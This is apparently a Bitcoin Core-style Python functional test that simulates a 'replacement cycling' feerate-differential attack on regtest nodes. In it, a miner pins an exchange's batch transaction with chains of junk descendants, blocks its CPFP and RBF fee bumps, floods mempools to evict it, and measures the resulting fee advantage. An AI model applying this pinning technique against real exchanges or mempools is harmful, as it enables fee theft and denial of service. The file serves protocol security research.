#!/usr/bin/env python3
# Copyright (c) 2023 The Bitcoin Core developers
# Distributed under the MIT software license, see the accompanying
# file COPYING or http://www.opensource.org/licenses/mit-license.php.

"""Test replacement cyling attacks - Feerate Differential Variant"""

from test_framework.key import (
        ECKey
)

from test_framework.messages import (
        CTransaction,
        CTxIn,
        CTxInWitness,
        CTxOut,
        COutPoint,
        sha256,
        COIN,
        tx_from_hex,
)

from test_framework.util import (
        assert_equal,
        assert_greater_than,
        gen_return_txouts,
        create_lots_of_big_transactions,
        assert_raises_rpc_error
)

from test_framework.wallet_util import generate_keypair

from test_framework.script import (
        CScript,
        hash160,
        OP_IF,
        OP_HASH160,
        OP_EQUAL,
        OP_ELSE,
        OP_ENDIF,
        OP_CHECKSIG,
        OP_SWAP,
        OP_SIZE,
        OP_NOTIF,
        OP_DROP,
        OP_CHECKMULTISIG,
        OP_EQUALVERIFY,
        OP_0,
        OP_2,
        OP_RETURN,
        OP_TRUE,
        SegwitV0SignatureHash,
        SIGHASH_ALL,
        SIGHASH_SINGLE,
        SIGHASH_ANYONECANPAY,
)

from decimal import Decimal

from test_framework.test_framework import BitcoinTestFramework

from test_framework.wallet import MiniWallet

def generate_batch_transaction(wallet, coin, input_amount, sat_per_vbyte, nSequence, mallet_pubkey_one, mallet_pubkey_two, alice_cpfp_pubkey):

    payout_output_script = CScript([OP_TRUE])
    payout_output_scriptpubkey = CScript([OP_0, sha256(payout_output_script)])

    mallet_output_script_one = CScript([mallet_pubkey_one, OP_CHECKSIG])
    mallet_output_scriptpubkey_one = CScript([OP_0, sha256(mallet_output_script_one)])
    mallet_output_script_two = CScript([mallet_pubkey_two, OP_CHECKSIG])
    mallet_output_scriptpubkey_two = CScript([OP_0, sha256(mallet_output_script_two)])

    alice_cpfp_output_script = CScript([alice_cpfp_pubkey, OP_CHECKSIG])
    alice_cpfp_output_scriptpubkey = CScript([OP_0, sha256(alice_cpfp_output_script)])

    payout_amount = 10000000

    payout_tx_fee = 534 * sat_per_vbyte
    payout_tx = CTransaction()
    payout_tx.vin.append(CTxIn(COutPoint(int(coin['txid'], 16), coin['vout']), b"", nSequence))

    payout_tx.vout.append(CTxOut(int(input_amount - payout_tx_fee - 10 * payout_amount), payout_output_scriptpubkey))
    # TODO: we use OP_TRUE style of spending for now.
    payout_tx.vout.append(CTxOut(payout_amount, payout_output_scriptpubkey)) # Payout Mallet One
    payout_tx.vout.append(CTxOut(payout_amount, payout_output_scriptpubkey)) # Payout Mallet Two
    payout_tx.vout.append(CTxOut(payout_amount, payout_output_scriptpubkey)) # Payout Alice CPFP
    payout_tx.vout.append(CTxOut(payout_amount, payout_output_scriptpubkey)) # Payout 4
    payout_tx.vout.append(CTxOut(payout_amount, payout_output_scriptpubkey)) # Payout 5
    payout_tx.vout.append(CTxOut(payout_amount, payout_output_scriptpubkey)) # Payout 6
    payout_tx.vout.append(CTxOut(payout_amount, payout_output_scriptpubkey)) # Payout 7
    payout_tx.vout.append(CTxOut(payout_amount, payout_output_scriptpubkey)) # Payout 8
    payout_tx.vout.append(CTxOut(payout_amount, payout_output_scriptpubkey)) # Payout 9
    payout_tx.vout.append(CTxOut(payout_amount, payout_output_scriptpubkey)) # Payout 10
    payout_tx.rehash()

    wallet.sign_tx(payout_tx)

    return payout_tx

def generate_single_tx(wallet, coin, input_amount, sat_per_vbyte, nSequence):

    single_tx_output_script = CScript([OP_TRUE])
    single_tx_output_scriptpubkey = CScript([OP_0, sha256(single_tx_output_script)])

    single_tx_output_amount = 100000

    single_tx_fee = 190 * sat_per_vbyte
    single_tx = CTransaction()
    single_tx.vin.append(CTxIn(COutPoint(int(coin['txid'], 16), coin['vout']), b"", nSequence))

    single_tx.vout.append(CTxOut(int(single_tx_output_amount), single_tx_output_scriptpubkey))
    single_tx.rehash()

    wallet.sign_tx(single_tx)

    return single_tx

def generate_single_tx_no_wallet(parent_txid, vout, input_amount, sat_per_vbyte, nSequence):

    single_tx_output_script = CScript([OP_TRUE])
    single_tx_output_scriptpubkey = CScript([OP_0, sha256(single_tx_output_script)])

    single_tx_fee = 190 * sat_per_vbyte
    single_tx_output_amount = input_amount - single_tx_fee

    single_tx = CTransaction()
    single_tx.vin.append(CTxIn(COutPoint(int(parent_txid, 16), vout), b"", nSequence))
    single_tx.vout.append(CTxOut(int(single_tx_output_amount), single_tx_output_scriptpubkey))

    single_tx.wit.vtxinwit.append(CTxInWitness())
    single_tx.wit.vtxinwit[0].scriptWitness.stack = [single_tx_output_script]

    single_tx.rehash()

    return single_tx

def generate_big_single_tx(txid, vout, input_amount, sat_per_vbyte, nSequence):

    single_tx_output_script = CScript([OP_TRUE])
    single_tx_output_scriptpubkey = CScript([OP_0, sha256(single_tx_output_script)])

    opreturn_scriptpubkey = CScript([OP_RETURN, b'\x01'*67437])

    single_tx_fee = 67437 * sat_per_vbyte
    single_tx = CTransaction()
    single_tx.vin.append(CTxIn(COutPoint(int(txid, 16), vout), b"", nSequence))

    single_tx.vout.append(CTxOut(int(input_amount - single_tx_fee), single_tx_output_scriptpubkey))
    single_tx.vout.append(CTxOut(int(0), opreturn_scriptpubkey))

    single_tx.wit.vtxinwit.append(CTxInWitness())
    single_tx.wit.vtxinwit[0].scriptWitness.stack = [single_tx_output_script]

    single_tx.rehash()

    return single_tx

def generate_fanout_tx(wallet, coin, input_amount, sat_per_vbyte, nSequence):

    single_tx_output_script = CScript([OP_TRUE])
    single_tx_output_scriptpubkey = CScript([OP_0, sha256(single_tx_output_script)])

    amount = 10000000
    single_tx_fee = 2000 * sat_per_vbyte
    single_tx = CTransaction()
    single_tx.vin.append(CTxIn(COutPoint(int(coin['txid'], 16), coin['vout']), b"", nSequence))

    for i in range(0, 50):
        single_tx.vout.append(CTxOut(amount, single_tx_output_scriptpubkey))
    single_tx.rehash()

    wallet.sign_tx(single_tx)
    return single_tx

def generate_chain_junk_tx(number_of_junk, parent_txid, parent_vout, input_amount, second_parent_txid, second_parent_vout, second_input_amount, sat_per_vbyte, nSequence):

    junk_txn = []

    junk_output_script = CScript([OP_TRUE])
    junk_output_scriptpubkey = CScript([OP_0, sha256(junk_output_script)])

    # Overpaid a bit in fees.
    junk_tx_fee = 316 * sat_per_vbyte

    first_junk_tx = CTransaction()
    first_junk_tx.vin.append(CTxIn(COutPoint(int(parent_txid, 16), parent_vout), b"", nSequence))
    first_junk_tx.vin.append(CTxIn(COutPoint(int(second_parent_txid, 16), second_parent_vout), b"", nSequence))
    first_junk_tx.vout.append(CTxOut(int(input_amount + second_input_amount - junk_tx_fee), junk_output_scriptpubkey))

    first_junk_tx.wit.vtxinwit.append(CTxInWitness())
    first_junk_tx.wit.vtxinwit[0].scriptWitness.stack = [junk_output_script]

    first_junk_tx.wit.vtxinwit.append(CTxInWitness())
    first_junk_tx.wit.vtxinwit[1].scriptWitness.stack = [junk_output_script]

    first_junk_tx.rehash()
    parent_txid = first_junk_tx.hash
    next_input_amount = input_amount + second_input_amount - junk_tx_fee

    junk_txn.append(first_junk_tx)

    for i in range(0, number_of_junk - 1):

        junk_tx = CTransaction()
        junk_tx.vin.append(CTxIn(COutPoint(int(parent_txid, 16), 0), b"", nSequence))
        junk_tx.vout.append(CTxOut(int(next_input_amount - junk_tx_fee), junk_output_scriptpubkey))

        junk_tx.wit.vtxinwit.append(CTxInWitness())
        junk_tx.wit.vtxinwit[0].scriptWitness.stack = [junk_output_script]

        junk_tx.rehash()

        junk_txn.append(junk_tx)

        parent_txid = junk_tx.hash
        next_input_amount = next_input_amount - junk_tx_fee

    return junk_txn

class ReplacementCyclingFeerateDifferentialTest(BitcoinTestFramework):

    def set_test_params(self):
        self.num_nodes = 3

        self.extra_args = [["-datacarriersize=100000", "-maxmempool=5"],
            ["-datacarriersize=100000", "-maxmempool=5"],
            ["-datacarriersize=100000", "-maxmempool=5"]]

    def fill_mempool(self, node, first_fanout_txid, second_fanout_txid):
        #self.log.info("Fill the mempool until eviction is triggered and the mempoolminfee rises")

        #self.log.info("Fill up the mempool with big txs with high sat per vbyte")
        counter = 0

        for i in range(0, 50):
            #self.log.info("Broadcasting Tx {}".format(counter))
 
            big_tx = generate_big_single_tx(first_fanout_txid, i, 10000000, 3, 0)

            big_txid = node.sendrawtransaction(big_tx.serialize().hex())

            counter += 1

        for i in range(0, 22):
            #self.log.info("Broadcasting Tx {}".format(counter))
 
            big_tx = generate_big_single_tx(second_fanout_txid, i, 10000000, 3, 0)

            big_txid = node.sendrawtransaction(big_tx.serialize().hex())

            counter += 1

        big_tx = generate_big_single_tx(second_fanout_txid, 23, 10000000, 3, 0)
        assert_raises_rpc_error(-26, "mempool full", node.sendrawtransaction, big_tx.serialize().hex(), 0)

        #self.log.info("Filling up the mempool done")

        mempool_gap = node.getmempoolinfo()["maxmempool"] - node.getmempoolinfo()["bytes"]

        #self.log.info("Mempool gap {}".format(mempool_gap))

        #self.log.info("Check that mempoolminfee is larger than minrelaytxfee")
        assert_equal(node.getmempoolinfo()['minrelaytxfee'], Decimal('0.00001000'))
        assert_greater_than(node.getmempoolinfo()['mempoolminfee'], Decimal('0.00001000'))

        mempoolminfee = node.getmempoolinfo()['mempoolminfee']
        #self.log.info("Mempoolminfee is {}".format(mempoolminfee))

    def test_replacement_cycling_feerate_differential(self):
        # Mary and Mallet are 2 Miners node
        # Mary and Mallet have equal odds to mine a block
        mary = self.nodes[0]
        mallet = self.nodes[1]

        # Alice is an Exchange node, i.e a Transaction Issuer.
        # Mallet is owning 2 balances at the exchange.
        alice = self.nodes[2]

        alice_wallet = self.wallet

        self.generate(alice, 501)

        self.sync_all()

        # Meta - We fan out some coins for latter on
        first_fan_out_coin = self.wallet.get_utxo()
        second_fan_out_coin = self.wallet.get_utxo()

        first_fanout_tx = generate_fanout_tx(self.wallet, first_fan_out_coin, first_fan_out_coin['value'] * COIN, 1, 0)
        second_fanout_tx = generate_fanout_tx(self.wallet, second_fan_out_coin, second_fan_out_coin['value'] * COIN, 1, 0)

        first_fanout_txid = alice.sendrawtransaction(hexstring=first_fanout_tx.serialize().hex(), maxfeerate=0)
        second_fanout_txid = alice.sendrawtransaction(hexstring=second_fanout_tx.serialize().hex(), maxfeerate=0)

        self.generate(alice, 1)

        assert_equal(0, len(mary.getrawmempool()))
        assert_equal(0, len(mallet.getrawmempool()))
        assert_equal(0, len(alice.getrawmempool())) 

        self.log.info("Starting Replacement Cycling Attack - Feerate Differential")

        coin_0 = self.wallet.get_utxo()
        coin_1 = self.wallet.get_utxo()

        # We generate "carpet" on-chain UTXOs with adequate scripts
        first_carpet_tx = generate_single_tx(self.wallet, coin_0, 50 * COIN, 2, 0)
        first_carpet_utxo_value = first_carpet_tx.vout[0].nValue
        first_carpet_txid = mallet.sendrawtransaction(hexstring=first_carpet_tx.serialize().hex(), maxfeerate=0)
        first_carpet_utxo_txid = first_carpet_txid

        second_carpet_tx = generate_single_tx(self.wallet, coin_1, 50 * COIN, 2, 0)
        second_carpet_utxo_value = second_carpet_tx.vout[0].nValue
        second_carpet_txid = mallet.sendrawtransaction(hexstring=second_carpet_tx.serialize().hex(), maxfeerate=0)
        second_carpet_utxo_txid = second_carpet_txid

        self.sync_all()

        assert first_carpet_txid in mary.getrawmempool()
        assert first_carpet_txid in mallet.getrawmempool()
        assert first_carpet_txid in alice.getrawmempool()

        assert second_carpet_txid in mary.getrawmempool()
        assert second_carpet_txid in mallet.getrawmempool()
        assert second_carpet_txid in alice.getrawmempool()

        self.log.info("Mallet confirms 2 carpet UTXOs for latter usage")

        self.generate(alice, 101)

        assert_equal(0, len(mary.getrawmempool()))
        assert_equal(0, len(mallet.getrawmempool()))
        assert_equal(0, len(alice.getrawmempool()))

        coin_2 = self.wallet.get_utxo()

        # Mallet is owning 2 balances at the exchange.
        mallet_privkey_one, mallet_pubkey_one = generate_keypair(wif=True)
        mallet_privkey_two, mallet_pubkey_two = generate_keypair(wif=True)
        # Alice has one key for CPFPing the batch
        alice_privkey_one, alice_pubkey_one = generate_keypair(wif=True)

        ### - - - - PHASE 1 : "Honest" Target Tx Network Propagation - - - - ###

        alice_batch_tx = generate_batch_transaction(alice_wallet, coin_2, 50 * COIN, 1, 0, mallet_pubkey_one, mallet_pubkey_two, alice_pubkey_one)

        self.log.info("Alice generates a batch transaction")

        alice_batch_txid = alice.sendrawtransaction(hexstring=alice_batch_tx.serialize().hex(), maxfeerate=0)

        self.sync_all()

        assert alice_batch_txid in mary.getrawmempool()
        assert alice_batch_txid in mallet.getrawmempool()
        assert alice_batch_txid in alice.getrawmempool()

        alice_batch_tx_mempool_entry = alice.getmempoolentry(alice_batch_txid)
        alice_batch_tx_base_fee = alice_batch_tx_mempool_entry['fees']['base']
        self.log.info("Alice Batch Tx Fees {}".format(alice_batch_tx_base_fee))

        self.log.info("Alice's batch transaction propagated among node mempools")
        self.log.info("Alice's batch transaction {}".format(alice_batch_txid))

        ### - - - - PHASE 2 : Target Transaction Jamming Kickstart - - - - ###

        # Mallet generates a chain of junk child at 2 sat-per-vbyte
        mallet_first_branch_junk_txn = generate_chain_junk_tx(24, alice_batch_txid, 1, 10000000, first_carpet_utxo_txid, 0, first_carpet_utxo_value, 1, 0)
        assert_equal(len(mallet_first_branch_junk_txn), 24)

        self.log.info("Mallet generates 1st branch of {} junk transactions".format(25))

        mallet_first_branch_ret_txid = []
        mallet_first_branch_base_fee = 0

        counter = 0
        for tx in mallet_first_branch_junk_txn:
            #self.log.info("Brodcasting junk {}".format(counter))
            txid = alice.sendrawtransaction(hexstring=tx.serialize().hex(), maxfeerate=0)
            mallet_first_branch_ret_txid.append(txid)
            counter += 1

        self.sync_all()

        for txid in mallet_first_branch_ret_txid:
            assert txid in mary.getrawmempool()
            assert txid in mallet.getrawmempool()
            assert txid in alice.getrawmempool()

        assert_equal(25, len(mary.getrawmempool()))
        assert_equal(25, len(mallet.getrawmempool()))
        assert_equal(25, len(alice.getrawmempool()))

        for txid in mallet_first_branch_ret_txid:
            mallet_tx_mempool_entry = mary.getmempoolentry(txid)
            mallet_first_branch_base_fee += mallet_tx_mempool_entry['fees']['base']

        self.log.info("Mallet's 1st chain of junk transactions Fees {}".format(mallet_first_branch_base_fee))

        self.log.info("Mallet's chain of junk transactions propagated among node mempools")

        coin_3 = self.wallet.get_utxo()

        self.log.info("Mallet's generates 2nd branch of {} junk transactions".format(1))

        mallet_second_branch_junk_txn = generate_chain_junk_tx(1, alice_batch_txid, 2, 10000000, second_carpet_utxo_txid, 0, second_carpet_utxo_value, 2, 0)
        assert_equal(len(mallet_second_branch_junk_txn), 1)

        mallet_second_branch_ret_txid = []
        mallet_second_branch_base_fee = 0

        counter = 0
        for tx in mallet_second_branch_junk_txn:
            #self.log.info("Brodcasting junk {}".format(counter))
            txid = alice.sendrawtransaction(hexstring=tx.serialize().hex(), maxfeerate=0)
            mallet_second_branch_ret_txid.append(txid)
            counter += 1

        self.sync_all()

        for txid in mallet_first_branch_ret_txid:
            assert txid in mary.getrawmempool()
            assert txid in mallet.getrawmempool()
            assert txid in alice.getrawmempool()

        assert_equal(26, len(mary.getrawmempool()))
        assert_equal(26, len(mallet.getrawmempool()))
        assert_equal(26, len(alice.getrawmempool()))

        for txid in mallet_second_branch_ret_txid:
            mallet_tx_mempool_entry = mary.getmempoolentry(txid)
            mallet_second_branch_base_fee += mallet_tx_mempool_entry['fees']['base']

        self.log.info("Mallet's 2nd chain of junk transactions Fees {}".format(mallet_second_branch_base_fee))

        ### - - - - PHASE 3: Target Transaction Jamming Effects - - - - ###

        self.log.info("Alice attempts to do a high-feerate CPFP on her batch transaction output...This should fail for too many descendants")

        alice_cpfp_tx = generate_single_tx_no_wallet(alice_batch_txid, 0, alice_batch_tx.vout[0].nValue, 100, 0)

        # Alice attempts to broadcast the CPFP
        assert_raises_rpc_error(-26, "too many descendants", alice.sendrawtransaction, alice_cpfp_tx.serialize().hex(), 0)
        # To further test, we try that Mary is the entry point of hte CPFP
        assert_raises_rpc_error(-26, "too many descendants", mary.sendrawtransaction, alice_cpfp_tx.serialize().hex(), 0)

        assert_equal(26, len(mary.getrawmempool()))
        assert_equal(26, len(mallet.getrawmempool()))
        assert_equal(26, len(alice.getrawmempool()))

        self.log.info("Alice attempts to do a high-feerate RBF on her root batch transaction...This should fail for less than conflicting txs")

        total_fees = alice_batch_tx_base_fee + mallet_first_branch_base_fee + mallet_second_branch_base_fee

        self.log.info("Alice RBF should override {} in absolute fees".format(total_fees))

        alice_batch_rbf_tx = generate_batch_transaction(alice_wallet, coin_2, 50 * COIN, 17, 0, mallet_pubkey_one, mallet_pubkey_two, alice_pubkey_one)

        # Alice attempts to broadcast the RBF
        assert_raises_rpc_error(-26, "insufficient fee", alice.sendrawtransaction, alice_batch_rbf_tx.serialize().hex(), 0)
        # To further test, we try that Mary is the entry point of hte CPFP
        assert_raises_rpc_error(-26, "insufficient fee", mary.sendrawtransaction, alice_batch_rbf_tx.serialize().hex(), 0)

        # We assign the alice batch_rbf_tx_fees to the total fees as a rough estimation. Picking up 18 as sat per vbyte succeeds.
        alice_batch_rbf_tx_estimation_fee = total_fees

        assert_equal(26, len(mary.getrawmempool()))
        assert_equal(26, len(mallet.getrawmempool()))
        assert_equal(26, len(alice.getrawmempool()))

        ### - - - - PHASE 4: Target Transaction Jamming Exfiltration - - - - ###

        # There is, at least, 1 factor altering the exfiltration of the jammed feerate in the final balance of the miners block
        # template, opportunistic mempool spikes flushing out jammed transactions.

        self.log.info("Replacement Cycling Attack - Feerate Differential - Dry Scenario")
 
        dry_mallet_block_template = alice_batch_rbf_tx_estimation_fee + mallet_first_branch_base_fee + mallet_second_branch_base_fee
        dry_mary_block_template = alice_batch_tx_base_fee + mallet_first_branch_base_fee + mallet_second_branch_base_fee

        self.log.info("Mallet Block Template Fees {} Mary Block Template Fees {}".format(dry_mallet_block_template, dry_mary_block_template))

        # Note: the absolute fee differential does not account for Mallet advantage to covertly compress the junk branck transaction
        # the junk transaction in his block template, therefore being able to mine more transactions per virtual byte for the same 
        # absolute fee.
        self.log.info("Dry Scenario: Mallet - Mary Absolute Fee Differential {}".format(dry_mallet_block_template - dry_mary_block_template))

        self.log.info("Replacement Cycling Attack - Feerate Differential - Wet Scenario")

        # We continue now with a "wet" scenario where there is a sudden influx of transactions
        self.log.info("There is a sudden influx of low-fees transactions in node mempools")

        self.fill_mempool(alice, first_fanout_txid, second_fanout_txid)
        self.fill_mempool(mallet, first_fanout_txid, second_fanout_txid)
        self.fill_mempool(mary, first_fanout_txid, second_fanout_txid)

        assert_equal(50 + 22, len(alice.getrawmempool()))
        assert_equal(50 + 22, len(mary.getrawmempool()))
        assert_equal(50 + 22, len(mallet.getrawmempool()))

        # We check that Alice batch transaction has been evicted out of the mempool
        assert alice_batch_txid not in mary.getrawmempool()
        assert alice_batch_txid not in mallet.getrawmempool()
        assert alice_batch_txid not in alice.getrawmempool()

        self.log.info("Alice Batch Transaction Has Been Evicted")

        wet_mallet_block_template = alice_batch_rbf_tx_estimation_fee
        wet_mary_block_template = 0

        self.log.info("Mallet Block Template Fees {} Mary Block Template Fees {}".format(wet_mallet_block_template, wet_mary_block_template))
        self.log.info("Wet Scenario: Mallet - Mary Absolute Fee Differential {}".format(wet_mallet_block_template - wet_mary_block_template))

    def run_test(self):
        self.wallet = MiniWallet(self.nodes[0])

        self.test_replacement_cycling_feerate_differential()

if __name__ == '__main__':
    ReplacementCyclingFeerateDifferentialTest().main()
